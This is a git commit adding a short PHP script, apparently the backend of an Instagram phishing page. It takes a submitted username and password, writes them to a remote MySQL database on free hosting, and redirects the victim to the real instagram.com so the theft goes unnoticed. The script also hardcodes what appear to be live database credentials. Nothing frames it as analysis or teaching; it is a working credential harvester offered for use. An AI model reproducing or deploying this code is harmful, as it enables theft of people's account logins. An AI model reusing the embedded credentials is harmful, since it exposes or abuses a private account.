c8f02d4dba0c153c570c6689e2285cc2dc4ad20f
login <103445765+web-L0GIN@users.noreply.github.com>
2023-03-01 16:12:53 +0100

    Add files via upload

---
+++ untitled.php
@@ -0,0 +1,31 @@
+<?php
+
+// Récupération des données du formulaire
+$id = $_POST['id'];
+$mdp = $_POST['mdp'];
+
+// Connexion à la base de données
+$host = 'sql107.epizy.com';
+$dbname = 'epiz_33700074_data_stockage';
+$username = 'epiz_33700074';
+$password = '3q8wCHfXAXwd';
+
+try {
+    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
+} catch (PDOException $e) {
+    die("Erreur de connexion à la base de données : " . $e->getMessage());
+}
+
+// Insertion des données dans la table "utilisateurs"
+$sql = "INSERT INTO utilisateurs (id, mdp) VALUES (:id, :mdp)";
+$stmt = $pdo->prepare($sql);
+$stmt->bindParam(':id', $id);
+$stmt->bindParam(':mdp', $mdp);
+$stmt->execute();
+
+// Fermeture de la connexion
+$pdo = null;
+
+header("Location: https://www.instagram.com/");
+exit;
+?>
